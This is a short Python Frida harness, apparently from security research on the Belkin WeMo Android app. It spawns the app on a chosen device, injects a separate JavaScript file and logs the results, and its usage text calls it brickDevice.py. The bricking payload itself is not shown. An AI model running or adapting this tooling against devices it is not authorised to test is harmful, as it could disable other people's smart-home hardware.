import frida, sys

if len(sys.argv) < 2:
    print("Enter Target Device ID by running 'adb devices' command")
    print("Usage: python3 brickDevice.py <deviceID>")
    exit()

# Function to communicate with injected script
resFile = open("brickDeviceResult.txt","w+")
def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
        resFile.write("{0}".format(message['payload']))
        resFile.write("\n")
    else:
        print(message)

# Find target device
devList = frida.get_device_manager().enumerate_devices()
devFound = 0
device = ""
devID = sys.argv[1] 
for dev in devList:
    if dev.id == devID:
        print("Found " + dev.id)
        device = dev
        devFound = 1
        break

if devFound == 0:
    print("Error device not found " + devID)
    exit()

# Spawn target app on the device
appPkg = "com.belkin.wemoandroid"
pid = device.spawn([appPkg])
device.resume(pid)
process = device.attach(pid)

# Read injected script
injectedScript = open(appPkg+".js","r",encoding="utf8")
script = process.create_script(injectedScript.read())

# Set up communication with injected script
script.on('message', on_message)

# Inject script
print('[*] Running')
script.load()

# Keep the script running
input()
print("[*] Closed")
process.detach()